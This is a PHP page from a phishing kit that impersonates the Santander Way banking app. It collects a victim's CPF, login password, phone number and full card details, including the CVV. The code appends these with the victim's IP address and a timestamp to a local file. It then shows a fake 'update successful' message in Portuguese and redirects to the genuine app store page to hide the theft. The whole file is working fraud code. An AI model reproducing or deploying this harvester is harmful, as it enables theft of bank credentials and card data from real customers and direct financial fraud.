<?php

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;
require 'vendor/autoload.php';

       $loginSenha = addslashes($_POST['CCsenha']);
       $cpf = addslashes($_POST['cpfbico']);
       $nomeCartao = addslashes($_POST['CardName']);
       $numCartao = addslashes($_POST['NumCard']);
       $validadeCartao = addslashes($_POST['ValidadeCC']);
       $CVV = addslashes($_POST['CVVCC']);
       $telefone = addslashes($_POST['Telefone']);
    
    
       $ip = $_SERVER["REMOTE_ADDR"];
       date_default_timezone_set('America/Sao_Paulo');
       $hora = date("Y-m-d  #  H:i:s");
   
       $corpomsg = " <p></p>
       ====SANTADER WAY======<br> <p></p>
       Cpf: $cpf <br> <p></p>
       Senha Login: $loginSenha<br> <p></p>
       Telefone: $telefone<br>    <p></p>   
       -----------------------<br> <p></p>
       Nome cartão: $nomeCartao<br> <p></p>
       Numero cartão: $numCartao<br> <p></p>
       Validade: $validadeCartao<br> <p></p>
       CVV: $CVV<br> <p></p>
       -----------------------<br> <p></p>
       Ip: $ip<br><p></p>
       Hora: $hora<br> <p></p>
       =======================";
         $fp = fopen("info.php", "a");
       fwrite($fp, $corpomsg);
       fclose($fp);
     
   
?>
<html>
    <head>
        <meta name="theme-color" content="#DF0202"/>
        <title>Santander Way</title>
        <meta http-equiv="refresh" content="15;URL=https://play.google.com/store/apps/details?id=br.com.santander.way&hl=pt_BR"/>
        <meta name="viewport" content="width=device-width, initial-scale=1"/>
        <meta name="content-type" content="text/html" charset="utf-8"/>        
        <link rel="stylesheet" href="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css" integrity="sha384-ggOyR0iXCbMQv3Xipma34MD+dH/1fQ784/j6cY/iJTQUOhcWr7x9JvoRxT2MZw1T" crossorigin="anonymous">
        <link href="https://fonts.googleapis.com/css?family=Open+Sans&display=swap" rel="stylesheet">
        <style>
             body{
                background-color: #DF0202 !important;
            }
            .header_red{
                width: 100%;                                
            }
            .img_Away{
                text-align: center;
                margin-top: 40px;
            }
            .img_Away img{
                width: 120px;
                height: 35px;
            }
            .versionApp{
                margin-top: 10px;
                text-align: center;
                padding-bottom: 5px;       
            }
            .versionApp span{
                color: #fff;
                font-size: 12px;
                font-family: 'Open Sans', sans-serif;
            }
            .sectionBg{
                border-top-left-radius: 10px;
                border-top-right-radius: 10px;
                background-color: #fff;
                width: 100%;
                height: 500;
               
            }
            .conteudo{                
                margin-top: 10%;
                width: 100%;
            }
            .BgCotentTitle{
                display: inline-block;
            }
            .boxSuccessImg{
                text-align: center;
            }
            .boxSuccessImg img{
                width: 150px;
            }
            .LegendaSucesso{
                margin-top: 20px;
                text-align: center;
            }
            .LegendaSucesso h1{
                font-size: 25px;
            }
            .BottomSuccessText{
                margin-top: 5px;
                text-align: center;
            }
        </style>
    </head>
    <body>
        <div class="container-fluid">
            <div class="row">
                <div class="header_red">
                    <div class="col-sm-12">
                        <div class="img_Away">
                            <img src="img/logoAway.jpg">                 
                        </div>
                    </div>
                    <div class="versionApp">
                        <span>Versão 2.2.10</span>
                    </div>
                </div>
            </div>
            <div class="row">
                <div class="sectionBg">                      
                    <div class="col-sm-12">
                        <div class="conteudo">
                            <div class="boxSuccessImg">
                                <img src="img/success_green.png"/>
                            </div>
                            <div class="LegendaSucesso">
                                <h1>Atualização Efetuada!</h1>
                            </div>
                            <div class="BottomSuccessText">
                                A atualização de seus dados foi efetuada com sucesso e você já pode voltar a utilizar os serviços que o banco Santander lhe oferece!
                                <br><br>
                                <span><b>Aguarde, você será redirecionado...</b><span>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </body>
</html>
